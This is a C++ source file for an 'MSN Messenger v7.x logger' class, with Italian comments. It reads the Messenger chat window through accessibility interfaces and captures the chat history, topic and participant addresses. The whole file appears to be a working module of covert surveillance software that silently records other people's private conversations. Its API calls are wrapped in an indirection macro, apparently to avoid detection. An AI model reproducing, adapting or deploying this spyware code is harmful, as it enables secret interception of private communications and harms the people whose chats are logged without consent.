/*
* MSN Messenger v7.x logger
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <exception>
#include <new>

using namespace std;

#include "QMsnLive.h"
#include "..\common.h"
#define MIN_SEARCH_LENGTH 200

PWCHAR QMsnLive::wChatTree[] = {
	L"IMWindowClass",
	L"DirectUIHWND",
	0
};



QMsnLive::QMsnLive(HWND hw) : QMsn6(hw)
{
	hwChat = ole.GetHandleFromClass(wChatTree);
}

QMsnLive::~QMsnLive()
{

}

BOOL QMsnLive::GrabHistory()
{
	LONG uCount;
	BSTR bChat;
	PWCHAR wHistory, wLine = NULL;

	if(!FNC(IsWindow)(ole.GetHandle()))
		return FALSE;

	if(hwChat == NULL)
		return FALSE;

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE)
		return FALSE;

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);

	if(uCount == 3) // Niente feature o chat con piu' partecipanti
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 1);
	else			// User con feature
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 2);

	// Se e' il primo grab di questo oggetto, prendi solo l'ultima
	// riga, in questo modo skippiamo tutta la history precedente.
	if(bFirstGrab){
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE){
			properties.SetUpdated(FALSE);
			return FALSE;
		}

		// In una chat vuota cmq c'e' un "a capo" inserito di default
		// dal programma
		if(wcslen(bChat) == 1)
			return TRUE;

		if(properties.SetHistory(bChat)){
			properties.ConvertNewLine();
			properties.CleanHistory();
			properties.SetUpdated(TRUE);
		}

		SAFE_SYSFREESTR(bChat);
		bFirstGrab = FALSE;
		return TRUE;
	}

	// Se siamo qui, non e' il primo grab
	// Tronca la history se e' gia' stata acquisita
	if(properties.GetAcquiredStatus()){
		properties.TruncateHistory();

		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE)
			return FALSE;

		wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

		if(wLine == NULL){
			SAFE_SYSFREESTR(bChat);
			return FALSE;
		}

		memset(wLine, 0x00, (wcslen(bChat) + 1) * sizeof(WCHAR));
		memcpy(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
		properties.ConvertNewLine(wLine);
		SAFE_SYSFREESTR(bChat);

		// Cerchiamo dove si trova l'ultima parte acquisita
		wHistory = properties.wcsrstr(wLine, properties.GetHistory());		
		
		if(wHistory == NULL){
			properties.AppendHistory(wLine);
			properties.SetUpdated(TRUE);
		} else if(wHistory == properties.GetHistory()){
			properties.SetUpdated(FALSE);
		}else{
			uCount = properties.GetHistoryLength();

			if(wcslen(wHistory) == uCount){
				properties.SetUpdated(FALSE);
			}else{
				properties.ClearHistory();
				properties.SetHistory(wHistory + uCount);
				properties.SetUpdated(TRUE);
			}
		}
	}else{ // Parti dall'ultima riga e confronta
		// Acquisiamo il contenuto della finestra
		ole.GetValueFromContainer(&bChat, CHILDID_SELF);

		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		uCount = properties.GetHistoryLength();
		wHistory = GetHistory();

		if(uCount > MIN_SEARCH_LENGTH)
			wHistory += uCount - MIN_SEARCH_LENGTH;
		
		if(!wcslen(bChat)){
			SAFE_SYSFREESTR(bChat);
			return TRUE;
		}

		wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

		if(wLine == NULL){
			SAFE_SYSFREESTR(bChat);
			return FALSE;
		}

		memset(wLine, 0x00, (wcslen(bChat) + 1) * sizeof(WCHAR));
		memcpy(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
		properties.ConvertNewLine(wLine);

		// Cerchiamo dove si trova l'ultima parte acquisita
		wHistory = wcsstr(wLine, wHistory);	

		if(!wcsncmp(wHistory, properties.GetHistory(), uCount)){
			properties.SetUpdated(FALSE);
		}else{
			properties.AppendHistory(wHistory + uCount);
			properties.SetUpdated(TRUE);
		}
		SAFE_SYSFREESTR(bChat);
	}

	if(wLine)
		delete[] wLine;

	SAFE_SYSFREESTR(bChat);
	return TRUE;
}

BOOL QMsnLive::GrabTopic()
{
	UINT uCount;
	BSTR bChat;

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE)
		return FALSE;

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);
	ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0);

	if(uCount == 3)
		properties.SetId(L"");
	else{
		ole.GetLineFromContainer(&bChat, 0);
		properties.SetId(bChat);
		SAFE_SYSFREESTR(bChat);
	}

	return TRUE;
}

/**
* Prende l'elenco dei partecipanti e lo mette nelle proprieta'.
*/
BOOL QMsnLive::GrabUserList()
{
	UINT uCount, i;
	BSTR bDesc;
	BOOL bFound = FALSE;

	if(!FNC(IsWindow)(ole.GetHandle())){
		properties.SetUsers(L"");
		return FALSE;
	}

	properties.ClearUsersList();

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);

	if(uCount == 3) // Niente feature o chat con piu' partecipanti
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0);
	else			// User con feature
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 1);

	// Prendi l'indirizzo dell'utente principale
	if(ole.GetValueFromContainer(&bDesc, CHILDID_SELF) == FALSE)
		return FALSE;

	properties.AppendUser(bDesc, FALSE);
	SAFE_SYSFREESTR(bDesc);

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_BUTTONMENU);

	for(i = 0; i < uCount; i++){
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_BUTTONMENU, i);
		
		if(ole.GetDescriptionFromContainer(&bDesc, 0) == FALSE)
			return FALSE;

		WCHAR wLast;
		PWCHAR pwFirst;
		wLast = bDesc[wcslen(bDesc) - 1];

		// I contatti sono nella forma <user@provider.tld>
		if(!wcsncmp(&wLast, L">", 1)){
			if((pwFirst = wcsrchr(bDesc, '<')) == NULL)
				continue;
			
			if(!bFound)
				properties.AppendTerminator();

			if(i < uCount - 1)
				properties.AppendUser(pwFirst, TRUE);
			else
				properties.AppendUser(pwFirst, FALSE);

			bFound = TRUE;
		}

		SAFE_SYSFREESTR(bDesc);
	}

	return TRUE;
}

